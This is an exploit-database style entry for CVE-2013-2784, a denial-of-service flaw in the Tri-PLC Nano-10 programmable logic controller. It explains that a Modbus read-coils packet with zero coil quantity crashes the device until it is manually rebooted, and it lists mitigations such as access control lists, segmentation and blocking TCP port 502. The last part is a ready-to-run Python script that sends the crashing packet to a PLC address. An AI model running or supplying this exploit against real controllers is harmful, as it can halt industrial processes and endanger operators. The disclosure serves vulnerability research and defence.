# Exploit Title: Tri-PLC Nano-10 DoS
# Date: 07/11/2013
# Exploit Author: Sapling
# Vendor Homepage: www.tri-plc.com
# Version: Firmware Version r81 and prior
# CVE : CVE-2013-2784
# ICSA: ICSA-13-189-02

/* The vulnerability exists due to a flaw in the PLC's ability to handle a
Modbus packet with the bit quantity of coils set to 0. When sending this
malformed packet the device crashes and fails to recover without manual
intervention. Once an engineer manually reboots the device it will recover
from the crash. In order to minimize the risk of this attack the Modbus
access control list can be used to limit the ip addresses that can connect
to the device. Additionally, limiting this device to segmented internal
networks is advised and blocking port TCP 502 at the gateway.
Note: I believe the device is also vulnerable to the same vulnerability
when executing write's as well but as most write functions are going to be
limited on devices or at least more so than reads would be.
Finally, I take no responsibility for the how or where you use this proof
of concept code and remind you to be responsible. */


# Python proof of concept
# For those more interested in the value meanings:
# Starting form the \x06 bit and down being the more important pieces
# \x06 length
# \x01 unit id
# \x01 function code (read coils)
# \x00\x00 start address
# \x00\x00 coil quantity


import sys
import socket

new = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
new.connect(('192.168.1.12', 502)) #Change the IP address to your PLC IP
Address
new.send('\x00\x01\x00\x00\x00\x06\x01\x01\x00\x00\x00\x00')